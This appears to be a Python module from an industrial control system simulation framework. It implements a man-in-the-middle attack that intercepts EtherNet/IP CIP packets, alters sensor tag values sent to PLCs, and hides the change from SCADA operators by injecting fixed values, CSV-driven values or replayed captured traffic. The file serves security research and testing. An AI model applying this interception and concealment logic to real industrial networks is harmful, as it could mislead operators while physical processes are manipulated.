from dhalsim.network_attacks.mitm_netfilter_queue_subprocess import PacketQueue
import argparse
from pathlib import Path

import os
import sys

import pandas as pd
import numpy as np

from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from dhalsim.network_attacks.utilities import translate_payload_to_float, translate_float_to_payload


class Error(Exception):
    """Base class for exceptions in this module."""


class ConcealmentError(Error):
    """Raised when there is an error in the concealment parameter"""


class ConcealmentMiTMNetfilterQueue(PacketQueue):

    def __init__(self, intermediate_yaml_path: Path, yaml_index: int, queue_number: int):
        super().__init__(intermediate_yaml_path, yaml_index, queue_number)
        self.attacked_tags = self.intermediate_attack['tags']
        self.logger.debug('Attacked tags:' + str(self.attacked_tags))
        self.scada_session_ids = []
        self.attack_session_ids = []
        self.concealment_type = None

        if 'concealment_data' in self.intermediate_attack.keys():
            if self.intermediate_attack['concealment_data']['type'] == 'path':
                self.concealment_type = 'path'

                self.concealment_data_pd = pd.read_csv(self.intermediate_attack['concealment_data']['path'])
            elif self.intermediate_attack['concealment_data']['type'] == 'value':
                self.concealment_type = 'value'

            elif self.intermediate_attack['concealment_data']['type'] == 'payload_replay' or\
                    self.intermediate_attack['concealment_data']['type'] == 'network_replay':

                self.concealment_type = self.intermediate_attack['concealment_data']['type']
                self.replay_start = int(self.intermediate_attack['concealment_data']['replay_start'])
                self.capture_start = int(self.intermediate_attack['concealment_data']['capture_start'])
                self.capture_end = int(self.intermediate_attack['concealment_data']['capture_end'])
                self.replay_duration = self.capture_end - self.capture_start

                if self.intermediate_attack['concealment_data']['type'] == 'payload_replay':
                    self.captured_tags_pd = pd.DataFrame(columns=self.get_conceal_tags())
                    self.logger.debug('Tags to be replayed will be: ' + str(self.captured_tags_pd))
                    self.logger.debug('Payload Capture and Replay duration is: ' + str(self.replay_duration))

                if self.intermediate_attack['concealment_data']['type'] == 'network_replay':
                    self.captured_packets_pd = pd.DataFrame(columns=['Packet'])
                    self.logger.debug('Network Capture and Replay duration is: ' + str(self.replay_duration))
            else:
                raise ConcealmentError("Concealment data type is invalid, supported values are: "
                                       "'concealment_value', 'concealment_path', or 'payload_replay' ")

        self.logger.debug('Concealment type is: ' + str(self.concealment_type))

    def get_conceal_tags(self):
        tag_list = []
        for tag in self.intermediate_attack['tags']:
            tag_list.append(tag['tag'])
        return tag_list

    def get_attack_tag(self, a_tag_name):
        # self.logger.debug('attacked tags: ' + str(self.attacked_tags))
        for tag in self.attacked_tags:
            if tag['tag'] == a_tag_name:
                return tag

    def handle_attack(self, session, ip_payload):
        if 'concealment_data' in self.intermediate_attack.keys():
            if self.concealment_type == 'payload_replay' or self.concealment_type == 'network_replay':
                current_clock = int(self.get_master_clock())
                if current_clock < self.replay_start or current_clock >= (self.replay_start + self.replay_duration):
                    # With replay concealment, we should not modify payloads, unless we are already replying
                    modified = False
                    return ip_payload, modified

        self.logger.debug('Attacking packet')

        # We support multi tag sending, using the same session. Context varies among tags
        for tag in self.intermediate_attack['tags']:
            if session['tag'] == tag['tag']:
                modified = True
                if 'value' in tag.keys():
                    self.logger.debug('Attacking with value')
                    self.logger.debug(f'Original value is: {ip_payload[Raw].load}')
                    self.logger.debug('Attack value is: ' + str(tag['value']))
                    return translate_float_to_payload(tag['value'], ip_payload[Raw].load), modified

                elif 'offset' in tag.keys():
                    self.logger.debug('Attacking with offset')
                    return translate_float_to_payload(
                        translate_payload_to_float(ip_payload[Raw].load) + tag['offset'],
                        ip_payload[Raw].load), modified

                # elif 'replay' ...

    def network_capture(self, ip_payload, current_clock):
        #self.logger.debug('Trying to capture packet...')
        self.captured_packets_pd.loc[current_clock, 'Packet'] = ip_payload[Raw].load
        #self.logger.debug('Captured packet:' + str(self.captured_packets_pd.loc[current_clock, 'Packet']))

        modified = False
        return ip_payload, modified

    def handle_network_replay(self, ip_payload):
        current_clock = int(self.get_master_clock())
        #self.logger.debug('Concealing with network replay')

        # Capture phase of the network replay concealment
        if self.capture_start <= current_clock < self.capture_end:
            self.logger.debug('capturing packet...')
            return self.network_capture(ip_payload, current_clock)

        if self.replay_start <= current_clock < self.replay_start + self.replay_duration:

            # Replay phase
            self.logger.debug('Starting replay phase')
            replay_position = self.capture_start + current_clock - self.replay_start

            # Maybe we did not captured a value for that tag at that iteration
            if replay_position in self.captured_packets_pd.index:
                validated_replay_position = replay_position
            else:
                # todo: There could be a case where the index exists, but the value is Nan
                validated_replay_position = min(self.captured_packets_pd.index, key=lambda x: abs(x - replay_position))

            self.logger.debug('Trying to replay: ' + str(self.captured_packets_pd.loc[validated_replay_position]['Packet']))
            modified = True
            return self.captured_packets_pd.loc[validated_replay_position]['Packet'], modified

        modified = False
        return ip_payload, modified

    def payload_capture(self, ip_payload, current_clock, this_tag):
        self.logger.debug('Capturing payload of tag ' + this_tag)
        self.captured_tags_pd.loc[current_clock, this_tag] = translate_payload_to_float(ip_payload[Raw].load)
        modified = False
        self.logger.debug('Captured payload: ' + str(self.captured_tags_pd.loc[current_clock]))
        return ip_payload, modified

    def handle_payload_replay(self, session, ip_payload):
        #self.logger.debug('Concealing with payload replay')
        current_clock = int(self.get_master_clock())
        this_tag = str(session['tag'])

        # Capture phase of the payload replay concealment
        if self.capture_start <= current_clock < self.capture_end:
            return self.payload_capture(ip_payload, current_clock, this_tag)

        # Replay phase
        if self.replay_start <= current_clock < self.replay_start + self.replay_duration:

            self.logger.debug('Replaying payload')
            self.logger.debug('Captured payloads pd: \n' + str(self.captured_tags_pd))
            replay_position = self.capture_start + current_clock - self.replay_start
            self.logger.debug('Replay position ' + str(replay_position))

            # Maybe we did not captured a value for that tag at that iteration
            if replay_position in self.captured_tags_pd.index and \
                    (not np.isnan(self.captured_tags_pd.loc[replay_position][this_tag])):
                validated_replay_position = replay_position
            else:
                # todo: There could be a case where the index exists, but the value is Nan
                validated_replay_position = min(self.captured_tags_pd.index, key=lambda x: abs(x - replay_position))

            concealment_value = float(self.captured_tags_pd.loc[validated_replay_position][this_tag])
            self.logger.debug('Replaying tag ' + str(this_tag) + ' with value '
                              + str(concealment_value))
            modified = True
            return translate_float_to_payload(concealment_value, ip_payload[Raw].load), modified

        # We could have moments that we are neither capturing, nor replaying

        modified = False
        return ip_payload, modified

    def handle_concealment_value(self, session, ip_payload):
        for tag in self.intermediate_attack['concealment_data']['concealment_value']:
            if session['tag'] == tag['tag']:
                modified = True
                if 'value' in tag.keys():
                    # self.logger.debug('Concealment value is: ' + str(tag['value']))
                    return translate_float_to_payload(tag['value'], ip_payload[Raw].load), modified
                elif 'offset' in tag.keys():
                    # self.logger.debug('Concealment offset is: ' + str(tag['offset']))
                    return translate_float_to_payload(
                        translate_payload_to_float(ip_payload[Raw].load) + tag['offset'],
                        ip_payload[Raw].load), modified

    def handle_concealment_path(self, session, ip_payload):
        # self.logger.debug('Concealing to SCADA with path')
        exp = (self.concealment_data_pd['iteration'] == self.get_master_clock())
        concealment_value = float(self.concealment_data_pd.loc[exp][session['tag']].values[-1])
        # self.logger.debug('Concealing with value: ' + str(concealment_value))
        modified = True
        return translate_float_to_payload(concealment_value, ip_payload[Raw].load), modified

    def handle_concealment(self, session, ip_payload):
        if self.intermediate_attack['concealment_data']['type'] == 'value':
            return self.handle_concealment_value(session, ip_payload)

        elif self.intermediate_attack['concealment_data']['type'] == 'path':
            return self.handle_concealment_path(session, ip_payload)

        elif self.intermediate_attack['concealment_data']['type'] == 'payload_replay':
            return self.handle_payload_replay(session, ip_payload)

        elif self.intermediate_attack['concealment_data']['type'] == 'network_replay':
            return self.handle_network_replay(ip_payload)

        # We could also let users finish the replay phase, but not finish the attack immediately
        modified = False
        return ip_payload, modified

    def handle_enip_response(self, ip_payload):
        this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)
        this_context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)

        # When target is SCADA, the concealment session will be stored in attack_session_ids
        if self.intermediate_attack['target'].lower() == 'scada':
            for session in self.attack_session_ids:
                if session['session'] == this_session and session['context'] == this_context:
                    #self.logger.debug('Concealing to SCADA: ' + str(this_session))
                    return self.handle_concealment(session, ip_payload)

        # Attack values to PLCs
        for session in self.attack_session_ids:
            if session['session'] == this_session and session['context'] == this_context:
                return self.handle_attack(session, ip_payload)

        # Concealment values to SCADA
        for session in self.scada_session_ids:
            if session['session'] == this_session and session['context'] == this_context:
                #self.logger.debug('Concealing to SCADA: ' + str(this_session))
                return self.handle_concealment(session, ip_payload)

        modified = False
        return ip_payload, modified

    def handle_enip_request(self, ip_payload):

        this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)
        tag_name = ip_payload[Raw].load.decode(encoding='latin-1')[54:60].split(':')[0]
        context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)

        #self.logger.debug('this tag is: ' + str(tag_name))
        this_tag = self.get_attack_tag(tag_name)

        if this_tag:
            # self.logger.debug('Tag name: ' + str(tag_name))
            #self.logger.debug('Attack tag: ' + str(this_tag['tag']))
            session_dict = {'session': this_session, 'tag': this_tag['tag'], 'context': context}
            #self.logger.debug('session dict: ' + str(session_dict))

            if ip_payload[IP].src == self.intermediate_yaml['scada']['public_ip']:
                #self.logger.debug('SCADA Req session')
                self.scada_session_ids.append(session_dict)
            else:
                #self.logger.debug('PLC Req session')
                self.attack_session_ids.append(session_dict)

    def capture(self, packet):
        """
        This function is the function that will run in the thread started in the setup function.

        For every packet that enters the netfilterqueue, it will check its length. If the length is
        in between 102, we are dealing with a CIP packet. We then change the payload of that
        packet and delete the original checksum.
        :param packet: The captured packet.
        """

        try:
            p = IP(packet.get_payload())
            if 'TCP' in p:
                if len(p) == 102:
                    p[Raw].load, modified = self.handle_enip_response(p)
                    if modified:
                        del p[IP].chksum
                        del p[TCP].chksum
                        packet.set_payload(bytes(p))
                    packet.accept()
                    return

                else:
                    if len(p) == 118 or len(p) == 116 or len(p) == 120:
                        #self.logger.debug('handling request 57')
                        self.handle_enip_request(p)
                        #self.logger.debug('handled request')
                    else:
                        packet.accept()
                        return

            packet.accept()

        except Exception as exc:
            print(exc)
            if self.nfqueue:
                self.nfqueue.unbind()
            sys.exit(0)


def is_valid_file(parser_instance, arg):
    """Verifies whether the intermediate yaml path is valid."""
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")
    parser.add_argument(dest="number", help="Number of que queue configured in IP Tables",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = ConcealmentMiTMNetfilterQueue(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index,
        queue_number=args.number)
    attack.main_loop()
